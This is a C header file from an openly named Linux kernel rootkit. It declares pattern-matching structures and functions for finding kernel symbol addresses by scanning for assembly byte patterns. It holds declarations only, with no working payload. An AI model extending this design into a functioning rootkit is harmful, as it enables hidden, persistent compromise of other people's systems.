#ifndef ROOTKIT_SYMBOL_H
# define ROOTKIT_SYMBOL_H

# include <linux/types.h>

# define SAVE 0xCAFE
# define SKIP 0xDEAD
# define END  0xC0DE

# define DEFAULT 0
# define FCT_DEFINED 0

struct asm_pattern {
    uint32_t pattern[64];
    enum {
        E_UNUSED,
        E_SAVE,
        E_POS,
    } type;
    bool(*setup_fct)(struct asm_pattern *);
    unsigned long start;
    unsigned long end;
};

struct asm_symbol {
    unsigned long addr;
    const char *name;
    unsigned long(*fct)(struct asm_symbol *);
    struct asm_pattern asm_pattern;
    unsigned long default_value;
};

void init_symbols(void);
unsigned long symbol_retrieve(const char *name);

#endif /*! ROOTKIT_SYMBOL_H */
